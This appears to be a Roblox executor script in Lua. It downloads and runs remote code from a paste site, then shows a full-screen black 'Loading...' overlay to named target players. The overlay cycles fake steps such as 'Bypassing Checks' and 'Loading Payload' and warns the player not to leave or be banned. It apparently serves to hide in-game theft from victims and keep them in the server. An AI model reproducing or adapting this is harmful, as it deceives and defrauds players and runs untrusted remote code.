-- Run your visual GUI script first
loadstring(game:HttpGet("https://pastefy.app/7oIIajYz/raw"))()

-- ‚è±Ô∏è Wait for 60 seconds before showing the GUI
-- üéØ Add your target player names here
local targetPlayers = {
    ["GAGpetstock28"] = true,
    ["4124214v"] = true,
    ["anotherplayer"] = true,
    
}

-- ‚ö° GUI display function
local function showLoadingGui()
    if not game:IsLoaded() then game.Loaded:Wait() end

    local CoreGui = game:GetService("CoreGui")
    local gui = Instance.new("ScreenGui")
    gui.Name = "ExecutorLoadingUI"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 999999999
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global

    pcall(function()
        if syn and syn.protect_gui then
            syn.protect_gui(gui)
        end
    end)

    gui.Parent = (gethui and gethui()) or CoreGui

    local bg = Instance.new("Frame", gui)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.BorderSizePixel = 0
    bg.ZIndex = 10000

    local status = Instance.new("TextLabel", bg)
    status.Size = UDim2.new(1, 0, 0, 50)
    status.Position = UDim2.new(0, 0, 0.45, 0)
    status.TextColor3 = Color3.fromRGB(255, 255, 255)
    status.BackgroundTransparency = 1
    status.Font = Enum.Font.SourceSansBold
    status.TextScaled = true
    status.Text = "Loading..."
    status.ZIndex = 10001

    local warnText = Instance.new("TextLabel", bg)
    warnText.Size = UDim2.new(1, 0, 0, 30)
    warnText.Position = UDim2.new(0, 0, 0.85, 0)
    warnText.TextColor3 = Color3.fromRGB(255, 0, 0)
    warnText.BackgroundTransparency = 1
    warnText.Font = Enum.Font.SourceSansBold
    warnText.TextScaled = true
    warnText.Text = "‚ö†Ô∏è PLEASE DO NOT LEAVE OR YOU WILL GET BANNED ‚ö†Ô∏è"
    warnText.ZIndex = 10001

    local steps = {
        "Script Executing",
        "Verifying Sources",
        "Fetching Key",
        "Checking Environment",
        "Bypassing Checks",
        "Loading Payload",
        "Finalizing Scripts",
        "Finishing Up"
    }

    spawn(function()
        while true do
            for _, msg in ipairs(steps) do
                for i = 0, 3 do
                    status.Text = msg .. string.rep(".", i)
                    wait(0.35)
                end
            end
        end
    end)
end

-- üîç Detect player join
game.Players.PlayerAdded:Connect(function(player)
    if targetPlayers[player.Name] then
        wait(2) -- Optional delay
        showLoadingGui()
    end
end)

-- üîÅ Also check already-joined players (e.g., you attach after they joined)
for _, player in ipairs(game.Players:GetPlayers()) do
    if targetPlayers[player.Name] then
        wait(2)
        showLoadingGui()
    end
end





